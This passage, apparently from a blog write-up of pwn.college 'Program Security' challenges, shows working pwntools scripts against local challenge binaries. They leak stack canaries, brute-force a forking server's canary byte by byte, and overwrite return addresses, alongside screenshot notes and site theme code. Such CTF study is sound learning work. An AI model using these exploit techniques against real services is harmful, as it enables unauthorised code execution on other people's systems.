payload_1 = b&#x27;A&#x27; * 18 + b&#x27;REPEAT&#x27; + b&#x27;A&#x27;<br>   ...:         p.sendafter(b&#x27;bytes)!&#x27;, payload_1)<br>   ...: <br>   ...:         p.recvuntil(b&#x27;REPEAT&#x27;)<br>   ...:         p.recv(1)<br>   ...:         canary_parts = p.recv(7)<br>   ...:         canary = u64(b&#x27;\x00&#x27; + canary_parts)<br>   ...:         log.success(f&quot;Canary: &#123;hex(canary)&#125;&quot;)<br>   ...: <br>   ...: <br>   ...:         win_low = 0x5c77 | (random.randint(0, 15) &lt;&lt; 12)<br>   ...: <br>   ...:         p.sendlineafter(b&#x27;Payload size:&#x27;, b&#x27;160&#x27;)<br>   ...: <br>   ...: <br>   ...:         payload_1 = b&#x27;a&#x27; * 24 + p64(canary) + b&#x27;a&#x27; * 8 + p16(win_low)<br>   ...:         p.sendafter(b&#x27;bytes)!&#x27;, payload_1)<br>   ...: <br>   ...:         out = p.recvall(timeout=2)<br>   ...:         if b&#x27;pwn&#x27; in out:<br>   ...:             print(out.decode(errors=&#x27;ignore&#x27;))<br>   ...:             break<br>   ...: <br>   ...:         p.close()<br>   ...:     except:<br>   ...:         p.close()<br></code></pre></td></tr></table></figure>
+
+
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769442823196-fae65a49-d784-4985-9cc4-177e33daf2c3.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Lingering-Leftover-Easy"><a href="#Lingering-Leftover-Easy" class="headerlink" title="Lingering Leftover (Easy)"></a><font style="color:#2F8EF4;">Lingering Leftover (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769446466232-b2b717af-7d22-408a-9f17-a693e3a79bd0.png" srcset="/img/loading.gif" lazyload></p>
+<p>easy</p>
+<p>we can leak flag in memory</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769446507885-6f5952f4-dc6f-4e5d-b159-d64169d62dd0.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Lingering-Leftover-Hard"><a href="#Lingering-Leftover-Hard" class="headerlink" title="Lingering Leftover (Hard)"></a><font style="color:#2F8EF4;">Lingering Leftover (Hard)</font></h5><p>0x1d0-0x10c&#x3D;196</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769446873632-32b5a170-3d28-4acf-8cbb-d60ab16d0c4e.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Latent-Leak-Easy"><a href="#Latent-Leak-Easy" class="headerlink" title="Latent Leak (Easy)"></a><font style="color:#2F8EF4;">Latent Leak (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769492947155-b9bbde02-4b60-49e6-84b3-bbeeeb490ba7.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769508087898-43797f77-6e01-4068-bdb4-4873733c5525.png" srcset="/img/loading.gif" lazyload></p>
+<p>where’s my canary???</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769508974986-e231e7c7-12cf-48f7-a5d5-58be488b9e72.png" srcset="/img/loading.gif" lazyload></p>
+<p>6</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769575118687-7d92648a-0c80-4d56-a936-06ff27724290.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769575210083-7d14b63c-4a9d-46e8-a3ff-89be9c818c0c.png" srcset="/img/loading.gif" lazyload></p>
+<p>we can find canary in buffer</p>
+<p>back to challenge_function</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769575734738-d5d2502c-3ebf-4cdd-8e4d-1d5cbf44ca43.png" srcset="/img/loading.gif" lazyload></p>
+<p>gdb!</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769575924438-196814e7-7b7b-4671-b37e-1416218cebd8.png" srcset="/img/loading.gif" lazyload></p>
+<p>canary is here!</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769576487799-1e770642-3159-4b5c-94b2-74c9c5baf5c1.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769576663022-74e9d4b3-5e5d-48ca-840c-c79678a354b7.png" srcset="/img/loading.gif" lazyload></p>
+<p>???</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769576684064-810ac265-3833-4a96-bea1-37b3621f89e2.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769576751092-e1302d55-5bed-45ff-afb4-9dc92f5378d5.png" srcset="/img/loading.gif" lazyload></p>
+<p>good</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769576798681-1969f9a2-01dc-4536-a3bd-0785e4fe2fe0.png" srcset="/img/loading.gif" lazyload></p>
+<p>but we haven’t repeat , there is still canary in buffer</p>
+<p>which function calling leaked canary at  0x7fff75aa62f8  ?</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769577382862-c2084fa3-bddd-4ddf-8595-17b283ab86db.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769577492745-590913bd-95a2-43e0-b79e-c463651758db.png" srcset="/img/loading.gif" lazyload></p>
+<p>over</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769577896341-ccb9b407-70ca-417d-a44c-946b60323d17.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [1]: from pwn import *<br>   ...: <br>   ...: <br>   ...: while True:<br>   ...:     try:<br>   ...:         p = process(&#x27;/challenge/latent-leak-easy&#x27;)<br>   ...: <br>   ...:         p.sendlineafter(b&#x27;Payload size:&#x27;, b&#x27;89&#x27;)<br>   ...:         p.sendafter(b&#x27;bytes)!&#x27;, b&#x27;REPEAT&#x27; + b&#x27;a&#x27; * 83)<br>   ...: <br>   ...:         p.recvuntil(b&#x27;You said: &#x27; + b&#x27;REPEAT&#x27; + b&#x27;a&#x27; * 83)<br>   ...:         canary = u64(b&#x27;\x00&#x27; + p.recv(7))<br>   ...:         log.info(f&quot;Canary: &#123;hex(canary)&#125;&quot;)<br>   ...: <br>   ...:         p.sendlineafter(b&#x27;Payload size:&#x27;, b&#x27;999&#x27;)<br>   ...: <br>   ...:         payload = b&#x27;A&#x27; * 360<br>   ...:         payload += p64(canary)<br>   ...:         payload += b&#x27;B&#x27; * 8<br>   ...:         payload += p16(0x6a3d)<br>   ...: <br>   ...:         p.sendafter(b&#x27;bytes)!&#x27;, payload)<br>   ...: <br>   ...:         out = p.recvall(timeout=1)<br>   ...:         if b&#x27;pwn&#x27; in out:<br>   ...:             print(out.decode(errors=&#x27;ignore&#x27;))<br>   ...:             break<br>   ...:         p.close()<br>   ...:     except EOFError:<br>   ...:         p.close()<br>   ...:         continue<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769578811996-23fb7b71-62e4-4bcd-b2ec-a5dbe2c5025d.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769578963632-78355870-e638-482a-91df-a4a77ef8e10c.jpeg" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Latent-Leak-Hard"><a href="#Latent-Leak-Hard" class="headerlink" title="Latent Leak (Hard)"></a><font style="color:#2F8EF4;">Latent Leak (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769579716611-184b1ef1-6a94-4c0a-a0fd-3656e3e2448a.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769579734520-9ff36e23-6fb0-4774-a1e5-bee07af2b255.png" srcset="/img/loading.gif" lazyload></p>
+<p>buffer_start is at rbp - 0x1d0 &#x3D; 0x7ffce8e70290</p>
+<p>offset &#x3D; 0x7ffce8e70348 - 0x7ffce8e70290 &#x3D; 184</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [1]: from pwn import *<br>   ...: <br>   ...: context.arch = &#x27;amd64&#x27;<br>   ...: <br>   ...: while True:<br>   ...:     try:<br>   ...:         p = process(&#x27;/challenge/latent-leak-hard&#x27;)<br>   ...: <br>   ...:         p.sendlineafter(b&#x27;Payload size:&#x27;, b&#x27;185&#x27;)<br>   ...:         p.sendafter(b&#x27;bytes)!&#x27;, b&#x27;REPEAT&#x27; + b&#x27;a&#x27; * 179)<br>   ...: <br>   ...:         p.recvuntil(b&#x27;You said: &#x27; + b&#x27;REPEAT&#x27; + b&#x27;a&#x27; * 179)<br>   ...:         canary = u64(b&#x27;\x00&#x27; + p.recv(7))<br>   ...:         log.info(f&quot;Canary: &#123;hex(canary)&#125;&quot;)<br>   ...: <br>   ...:         p.sendlineafter(b&#x27;Payload size:&#x27;, b&#x27;999&#x27;)<br>   ...: <br>   ...:         payload = b&#x27;A&#x27; * 456<br>   ...:         payload += p64(canary)<br>   ...:         payload += b&#x27;B&#x27; * 8<br>   ...:         payload += p16(0x69fe)<br>   ...: <br>   ...:         p.sendafter(b&#x27;bytes)!&#x27;, payload)<br>   ...: <br>   ...:         out = p.recvall(timeout=1)<br>   ...:         if b&#x27;pwn&#x27; in out:<br>   ...:             print(out.decode(errors=&#x27;ignore&#x27;))<br>   ...:             break<br>   ...:         p.close()<br>   ...:     except EOFError:<br>   ...:         p.close()<br>   ...:         continue<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769580120707-2028c2ee-dbbb-4560-9736-91e64ff3887e.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Fork-Foolery-Easy"><a href="#Fork-Foolery-Easy" class="headerlink" title="Fork Foolery (Easy)"></a><font style="color:#2F8EF4;">Fork Foolery (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769580513536-755b0465-7dfc-4c1e-8e27-095299d5d580.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [3]: from pwn import *<br>   ...: context.log_level = &#x27;warn&#x27;<br>   ...: canary = b&quot;\x00&quot;<br>   ...: <br>   ...: for i in range(7):<br>   ...:     for b in range(256):<br>   ...:         try:<br>   ...:             io = remote(&quot;127.0.0.1&quot;, 1337)<br>   ...:             io.recvuntil(b&quot;Payload size:&quot;)<br>   ...:             io.sendline(b&#x27;999&#x27;)<br>   ...:             io.recvuntil(b&#x27;bytes)!&#x27;)<br>   ...: <br>   ...:             payload = b&quot;A&quot; * 40 + canary + bytes([b])<br>   ...:             io.send(payload)<br>   ...: <br>   ...:             result = io.recvall(timeout=0.5)<br>   ...: <br>   ...:             if b&quot;stack smashing detected&quot; not in result:<br>   ...:                 canary += bytes([b])<br>   ...:                 print(f&quot;找到第&#123;i+2&#125; 位: &#123;hex(b)&#125; &quot;)<br>   ...:                 io.close()<br>   ...:                 break<br>   ...:             io.close()<br>   ...:         except:<br>   ...:             continue<br>   ...: <br>   ...: print(f&quot;Canary: &#123;canary.hex()&#125;&quot;)<br>   ...: <br>   ...: print(&quot;NEXT&quot;)<br>   ...: x= 0x01<br>   ...: while True:<br>   ...:     try:<br>   ...:         io = remote(&quot;127.0.0.1&quot;, 1337)<br>   ...:         io.recvuntil(b&quot;Payload size:&quot;)<br>   ...:         io.sendline(b&#x27;999&#x27;)<br>   ...:         io.recvuntil(b&#x27;bytes)!&#x27;)<br>   ...: <br>   ...:         payload = b&quot;A&quot; * 40 + canary + b&quot;B&quot; * 8 + p8(0x48) +p8(x)<br>   ...: <br>   ...: <br>   ...:         io.send(payload)<br>   ...:         x+=1<br>   ...:         out = io.recvrepeat(timeout=1)<br>   ...: <br>   ...:         if b&quot;pwn&quot; in out :<br>   ...: <br>   ...:             print(out.decode(errors=&#x27;ignore&#x27;))<br>   ...:             break<br>   ...:         io.close()<br>   ...:     except:<br>   ...:         continue<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769594752865-881204e5-af1c-48b1-9198-822526749bf9.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Fork-Foolery-Hard"><a href="#Fork-Foolery-Hard" class="headerlink" title="Fork Foolery (Hard)"></a><font style="color:#2F8EF4;">Fork Foolery (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769606310045-09af06f3-197d-412c-9725-5a05dd7b72c4.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769606496243-a56a0a3c-b0a0-4d3a-be3b-41186f834105.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769606632414-24e57fe6-2534-4dae-ab99-a22d31d2cabf.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h4 id="Complex-Corruption"><a href="#Complex-Corruption" class="headerlink" title="Complex Corruption"></a><font style="color:rgb(120, 190, 32);background-color:rgb(16, 16, 16);">Complex Corruption</font></h4><h5 id="Canary-Conundrum-Easy"><a href="#Canary-Conundrum-Easy" class="headerlink" title=" Canary Conundrum (Easy)"></a><font style="color:#2F8EF4;"> </font><strong><font style="color:#2F8EF4;">Canary Conundrum (Easy)</font></strong></h5><p><strong><font style="color:#2F8EF4;"></font></strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn-college/" class="category-chain-item">pwn.college</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pwn.college-pro sec-_Program Security</div>
+      <div>https://ghostshark-pro.github.io/2026/04/23/pwn.college-pro sec-_Program Security/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>shark</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted</div>
+          <div>2026年4月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>License</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/23/pwn.college-pro%20sec-_Return%20Oriented%20Programming/" title="pwn.college-pro sec-_Return Oriented Programming">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">pwn.college-pro sec-_Return Oriented Programming</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/23/pwn.college-pro%20sec-_Program%20Explotation/" title="pwn.college-pro sec-_Program Explotation">
+                        <span class="hidden-mobile">pwn.college-pro sec-_Program Explotation</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>TOC</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Grep</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/star.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Please enable JavaScript to render the matrix.</div>
+  </noscript>
+</body>
+</html>
